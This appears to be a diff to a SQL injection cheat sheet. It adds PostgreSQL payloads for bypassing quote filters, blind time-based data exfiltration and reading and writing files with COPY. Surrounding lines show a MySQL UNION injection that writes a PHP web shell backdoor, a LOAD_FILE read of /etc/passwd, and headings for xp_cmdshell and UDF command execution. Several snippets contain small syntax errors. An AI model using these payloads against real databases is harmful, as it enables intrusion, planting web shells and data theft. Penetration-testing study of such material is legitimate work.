@@ -168,6 +168,12 @@ select 0x002F6574632F736861646F77
 Functions:
 char() and hex()
 
+Postgress bypass single quote (') restriction:
+{% highlight sql %}
+select $TAG$text$TAG$
+select $$text$$
+{% endhighlight %}
+
 Try SQLMap tamper scripts
 
 
@@ -218,6 +224,11 @@ substr((select table_name from information_schema.tables limit 1),1,1) > "m"
 
 {% endhighlight %}
 
+Postgres Exfiltration:
+{% highlight sql %}
+select case when(ascii(substr((select content from read_file)1,1))=97) then pg_sleep(5) end;
+{% endhighlight %}
+
 > **Stacked Queries**
 
 Allows multiple commands with a ';'  (Mostly MSSQL):
@@ -228,17 +239,46 @@ Dent' ;  CREATE TABLE exfil(data varchar(1000));--
 
 > **Reading and Writing Files**
 
-MySQL and MSSQL:
-{% highlight sql %}
 MySQL Reading:
+{% highlight sql %}
 Dent'+UNION+SELECT++'1'%2C+'2'%2C+'3'%2C+LOAD_FILE("%2Fetc%2Fpasswd")%3B+%23
+{% endhighlight %}
 
 MySQL Writing:
+{% highlight sql %}
 INTO OUTFILE 
 http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+{% endhighlight %}
 
 SQL Server Reading: 
+{% highlight sql %}
 BULK INSERT
+{% endhighlight %}
+
+Postgress write file:
+{% highlight sql %}
+select * from temptable; --make sure it doesn't exist
+CREATE TEMP TABLE temptable (content text); INSERT INTO temptable(anyname) VALUES (chr(119)||chr(48)||chr(116));
+COPY temptable(name) to $$C:\test.txt$$
+
+--another way
+copy (select $$text$$) to $$c:\test.txt$$;
+
+--verify it was written
+select * from temptable; --make sure it doesn't exist
+CREATE TEMP TABLE temptable (content text); 
+COPY temptable from $$c:\users\public\test.txt$$;
+select case when(ascii(substr((select content from temptable)1,1))=116) then pg_sleep(5) end;
+
+{% endhighlight %}
+
+Postgress read file:
+{% highlight sql %}
+select * from temptable; --make sure it doesn't exist
+CREATE TEMP TABLE temptable (content text); 
+COPY temptable from $$c:\users\public\test.txt$$;
+select * from temptable;
+select case when(ascii(substr((select content from temptable)1,1))=97) then pg_sleep(5) end;
 {% endhighlight %}
 
 > **MSSQL Enable xp_cmdshell, exploit, and exfil**
@@ -286,6 +326,9 @@ split -b 2048 lib_postgresqludf_sys.so
 In postgres: 
 
 {% highlight sql %}
+--Verify permissions 
+SELECT case when (select current_setting($$is_superuser$$))=$$on$$ then pg_sleep(5) end;
+
 SELECT lo_creat(-1);
 
 set c0 `base64 -w 0 /tmp/xaa`
